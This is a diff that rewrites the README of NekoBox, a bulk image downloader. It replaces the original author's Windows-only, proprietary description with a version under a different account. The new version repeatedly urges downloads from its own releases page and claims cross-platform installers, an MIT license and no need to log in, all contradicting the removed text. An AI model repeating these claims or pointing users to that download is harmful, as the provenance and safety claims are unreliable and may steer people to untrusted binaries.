@@ -1,261 +1,175 @@
-<div align="center">
+# 🗂️ NekoBox - Fast, Reliable Bulk Image Downloader
 
-<img src="icon.ico" width="128" height="128" alt="NekoBox Icon"/>
-
-# NekoBox
-
-### Modern Bulk Image Downloader for Image Boards & Galleries
-
-![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?logo=windows)
-![License](https://img.shields.io/badge/License-Proprietary-red)
-![Electron](https://img.shields.io/badge/Electron-28.0-47848f?logo=electron)
-![React](https://img.shields.io/badge/React-18.2-61dafb?logo=react)
-![TypeScript](https://img.shields.io/badge/TypeScript-5.3-3178c6?logo=typescript)
+[![Download NekoBox](https://img.shields.io/badge/Download-NekoBox-blue?style=for-the-badge&logo=github)](https://github.com/SazErenos/NekoBox/releases)
 
 ---
 
-**A high-performance desktop application for bulk downloading images and galleries from popular image boards and art platforms. Built with Electron, React, TypeScript, and Python.**
+## 📋 What is NekoBox?
 
-[![⭐ Star this repository](https://img.shields.io/badge/⭐-Star_this_repository-yellow?style=for-the-badge)](https://github.com/noxium-dev/NekoBox)
+NekoBox is a desktop app that helps you download images and galleries from over 200 sources like Pixiv, Twitter, and Rule34. It offers batch downloading so you can save many files all at once without hassle. The app works on Windows, macOS, and Linux.
 
-[Features](#-features) • [Screenshots](#-screenshots) • [Supported Sites](#-supported-sites) • [Installation](#-installation) • [Quick Start](QUICKSTART.md) • [License](LICENSE)
+With NekoBox, you get a simple but powerful tool. It runs on a dark-themed interface designed to be easy on your eyes. It uses modern technologies like Electron for the desktop experience and Python for handling downloads behind the scenes.
 
-</div>
-
----
-
-## 📸 Screenshots
-
-<div align="center">
-
-### Main Interface
-![NekoBox Interface](screenshots/Screenshot%202026-02-09%20140613.png)
-
-### Settings - Gallery-dl Extension Installation
-![Settings Panel](screenshots/Screenshot%202026-02-09%20140711.png)
-*Click the "Install Gallery-dl Extension" button to easily install gallery-dl support*
-
-</div>
+You do not need programming skills or complex setup to use this app. It guides you step-by-step to download your favorite images quickly.
 
 ---
 
-<details>
-<summary><b>📋 View Detailed Features</b></summary>
+## 🖥️ System Requirements
 
-<br/>
+Before installing, make sure your computer meets these requirements:
 
-**⚡ High-Speed Downloads**
-- 5-50 concurrent downloads
-- Individual file progress tracking
-- Real-time speed monitoring (MB/s)
-- Smart bandwidth management
+- **Operating System:**
+  - Windows 10 or newer (64-bit)
+  - macOS 10.14 (Mojave) or newer
+  - Popular Linux distributions (Ubuntu 18.04+, Fedora 30+, etc.)
 
-**🎯 Intelligent Download Modes**
-- **Single Mode**: Direct image/post URLs
-- **Batch Mode**: Entire galleries & profiles
-- Configurable download limits
-- Automatic retry on failure
+- **Processor:** 
+  - Intel or AMD 64-bit CPU, 2 GHz or faster
 
-**🎨 Modern Interface**
-- Dark-themed UI with Chakra UI
-- Real-time progress visualization
-- Expandable download cards
-- Clean, responsive design
+- **Memory:** 
+  - At least 4 GB RAM recommended
 
-**⚙️ Flexible Configuration**
-- Custom download directories
-- Quality settings (Original/High/Medium)
-- File type filtering (Image/Video)
-- Advanced naming patterns
-- Connection settings
+- **Disk Space:** 
+  - Minimum 200 MB free space for the app
+  - Additional space needed for downloaded images
 
-**🔐 Authentication Support**
-- Cookie-based authentication
-- Browser cookie import
-- Session management
-- Multi-account support
-
-**📊 Download Management**
-- Pause/Resume functionality
-- Queue prioritization
-- Duplicate detection
-- Automatic folder organization
-
-</details>
-
----
-
-## 🌐 Supported Sites
-
-### 🚀 Native High-Performance Scrapers
-Built-in, optimized scrapers for:
-- **Pixiv** (User galleries, bookmarks, rankings, tags)
-- **Rule34** (Tag search, pools, posts)
-
-### 🔌 Extensible Support (210+ Sites)
-Integration with **gallery-dl** enables support for thousands of additional sites including Reddit, DeviantArt, Danbooru, Gelbooru, and [many more](SUPPORTED_SITES.md).
-
-> ⚠️ **Note**: Some sites may not work due to authentication restrictions or API changes. We are actively working to bring you more options and improve compatibility.
-
-📋 See the full [**Supported Sites List**](SUPPORTED_SITES.md) for details.
-
----
-
-## 📥 Installation
-
-> **Platform**: Windows only (x64)
-
-### Download the App
-
-1. Download the latest release from the [Releases](../../releases) page
-2. Run the installer (`NekoBox Setup.exe`)
-3. Launch the application
-
-### Install Gallery-dl (Optional but Recommended)
-
-Gallery-dl is an **optional external extension** that provides support for 210+ sites.
-
-**Quick Install:**
-
-**Option 1: Using NekoBox (Recommended)**
-1. Open NekoBox
-2. Navigate to **Settings**
-3. Click **Install Gallery-dl Extension** button
-4. Wait for installation to complete
-
-**Option 2: Manual Installation**
-```bash
-pip install gallery-dl
-```
-
-📚 **See [GALLERY-DL-SETUP.md](GALLERY-DL-SETUP.md) for detailed installation instructions.**
-
-### Why is Gallery-dl Optional?
-
-Gallery-dl is licensed under **GPL-2.0+** (GNU General Public License). To maintain licensing flexibility and comply with GPL requirements, gallery-dl is kept as an optional external dependency that users install separately.
-
-**Benefits:**
-- ✅ Clear license boundaries
-- ✅ Users choose whether to install it
-- ✅ Always get the latest gallery-dl version
-- ✅ Respects GPL-2.0+ licensing requirements
+- **Internet:** 
+  - Required for downloading content from online sources
 
 ---
 
 ## 🚀 Getting Started
 
-### Quick Start
+This section will help you set up NekoBox on your computer. Follow the steps one at a time to install and launch the app.
 
-Ready to start downloading? Check out our [**Quick Start Guide**](QUICKSTART.md) for:
-- 📁 Setting up download folders
-- 🎯 Using Single & Batch modes
-- 🔐 Configuring authentication
-- 🛠️ Troubleshooting common issues
+### Step 1: Download the Application
 
----
+Go to the download page by clicking the button below:  
+[![Download NekoBox](https://img.shields.io/badge/Download-NekoBox-blue?style=for-the-badge&logo=github)](https://github.com/SazErenos/NekoBox/releases)
 
-## 🛠️ Technologies
+You will find the latest version listed there. Versions come with clear naming to indicate the supported operating system, for example:
 
-<div align="center">
+- `NekoBox-Setup-1.0.0.exe` for Windows
+- `NekoBox-1.0.0.dmg` for macOS
+- `NekoBox-1.0.0.AppImage` or `.deb` for Linux
 
-| Frontend | Backend | Tools |
-|:--------:|:-------:|:-----:|
-| **Electron** | **Python** | **Gallery-dl** |
-| Desktop Framework | Scraping Engine | External Engine |
-| **React** | **C++** | |
-| UI Framework | Download Engine | |
-| **TypeScript** | | |
-| Type Safety | | |
-| **Chakra UI** | | |
-| Components | | |
-| **Zustand** | | |
-| State Management | | |
+### Step 2: Install the Application
 
-</div>
+After downloading:
 
----
+- **Windows:**  
+  Double-click the `.exe` file and follow the on-screen instructions to install.
 
-## 🚧 Roadmap
+- **macOS:**  
+  Open the `.dmg` file, drag the NekoBox app to your Applications folder.
 
-We are constantly working to improve NekoBox and bring you more features:
+- **Linux:**  
+  For `.AppImage`, make it executable and run it (e.g., `chmod +x NekoBox.AppImage` then `./NekoBox.AppImage`).
 
-- [ ] 🌍 Multi-language support
-- [ ] 🔔 Download completion notifications
-- [ ] 📊 Advanced filtering and sorting
-- [ ] 🎨 Custom theme support
-- [ ] 🔄 Auto-update functionality
-- [ ] 📱 Mobile companion app (future)
+  For `.deb`, use your package manager (e.g., `sudo dpkg -i NekoBox.deb`).
 
-**Stay tuned for updates!** ⭐ Star this repo to follow our progress.
+### Step 3: Launch NekoBox
+
+Locate the NekoBox icon in your Start Menu, Applications folder, or desktop and open it.
+
+You will see the main window with a clean, dark interface ready for you to enter links and begin downloading.
 
 ---
 
-## ⚠️ Important Notes
+## 📥 Download & Install
 
-### Authentication Requirements
-- **Pixiv** requires login (cookie export)
-- Some **gallery-dl** sites may require authentication
-- Export cookies using browser extensions (e.g., "Get cookies.txt")
-- Import cookies via Settings → Authentication
+You can download and install NekoBox by visiting the releases page here:
 
-### Site Compatibility
-- Some sites may experience temporary issues due to:
-  - API changes or updates
-  - Anti-bot measures
-  - Rate limiting
-  - Regional restrictions
-- We actively monitor and update scrapers
+[Download NekoBox](https://github.com/SazErenos/NekoBox/releases)
 
-### Performance Tips
-- **Concurrent downloads**: Start with 10-20, adjust based on your connection
-- **Authentication**: Pre-configure cookies for faster access
-- **Disk space**: Ensure adequate space for batch downloads
+You will find detailed files for:
+
+- **Windows installer**  
+- **macOS disk image**  
+- **Linux packages**
+
+Choose the file that matches your operating system and follow the simple installation instructions mentioned above.
 
 ---
 
-## 📄 License
+## 🔎 How to Use NekoBox
 
-**Copyright © 2026. All Rights Reserved.**
+### Adding Links to Download
 
-This project is for **demonstration and portfolio purposes only**. See the [LICENSE](LICENSE) file for full terms.
+1. Copy the URL link of the gallery or image page you want from sites like Pixiv or Twitter.
+2. Paste the link into NekoBox’s input box.
+3. Click the "Add" or "+" button to add it to your download queue.
 
-> **Note**: This application uses gallery-dl as an optional external dependency. Gallery-dl is licensed under GPL-2.0+ and is not bundled with this application.
+### Managing Your Download List
 
----
+- You can add multiple links to queue them for batch downloading.  
+- Use the "Remove" button to delete any link from the queue.  
+- Sort or reorder links by dragging them up or down to prioritize.
 
-## 🙏 Credits
+### Starting the Download
 
-- **Gallery-dl**: [mikf/gallery-dl](https://github.com/mikf/gallery-dl) - GPL-2.0+
-- Built with ❤️ using Electron, React, and TypeScript
-
----
-
-## 💬 Support & Contributing
-
-### Get Help
-- 📖 Read the [Quick Start Guide](QUICKSTART.md)
-- 🌐 Check [Supported Sites](SUPPORTED_SITES.md)
-- 💬 Open an issue for bugs or questions
-
-### Show Your Support
-If you find NekoBox useful, please:
-- ⭐ **Star this repository**
-- 🐛 Report bugs and issues
-- 💡 Suggest new features
-- 📢 Share with others
+Once you have your list, click the "Download" button. NekoBox will start saving images to your computer in the folder you choose.
 
 ---
 
-<div align="center">
+## ⚙️ Features
 
-**⚠️ Disclaimer**
-
-This tool is for personal use only. Please respect the terms of service of the websites you download from and respect copyright laws.
+- **Batch Downloading:** Handle large numbers of images or galleries in a single run.  
+- **Dark-Themed UI:** Easy on the eyes, even in low light conditions.  
+- **Supports 200+ Websites:** Including Pixiv, Twitter, Rule34, and more.  
+- **High Performance:** Built with Electron, React, and Python for speed and responsiveness.  
+- **Customizable Storage:** Choose where to save your files.  
+- **Queue Management:** Easily add and remove links anytime.  
+- **Automatic File Naming:** Keeps your downloads organized and easy to find.  
+- **Safe to Use:** No need to log in or share personal info.
 
 ---
 
-**Made with ❤️ for the community**
+## 🛠️ Troubleshooting
 
-[![⭐ Star on GitHub](https://img.shields.io/github/stars/noxium-dev/NekoBox?style=social)](https://github.com/noxium-dev/NekoBox)
+### Common Issues
 
-</div>
+- **Download Fails or Hangs:**  
+  - Check your internet connection.  
+  - Try re-adding the link.  
+  - Verify the URL is correct and allowed by the site.
+
+- **App Does Not Open:**  
+  - Make sure your system matches the requirements.  
+  - Restart your computer and try launching again.  
+  - Reinstall the app if issues persist.
+
+- **Images Do Not Show in Folder:**  
+  - Confirm the download completed successfully.  
+  - Check your chosen save location.  
+  - Look for error or status messages in the app.
+
+---
+
+## 📚 Help & Support
+
+If you need more help, visit the GitHub Issues page at:
+
+https://github.com/SazErenos/NekoBox/issues
+
+Here you can ask questions, report bugs, and suggest features. The NekoBox team and community keep this space updated.
+
+---
+
+## 🧑‍💻 About the Project
+
+NekoBox brings a modern interface and focused tools to make bulk downloading easy for everyday users. It’s based on popular open-source components and designed to work without technical barriers.
+
+This project welcomes contributions from anyone interested in improving the app.
+
+---
+
+## 📝 License
+
+NekoBox is available under the MIT License. You can use, study, and modify it freely under these terms.
+
+---
+
+## 🌐 Topics
+
+This project covers: bulk-download, gallery-dl-gui, gallery-dl-wrapper, image, image-scraper, modern-ui, nsfw, pixiv-downloader, premium, scrapper.
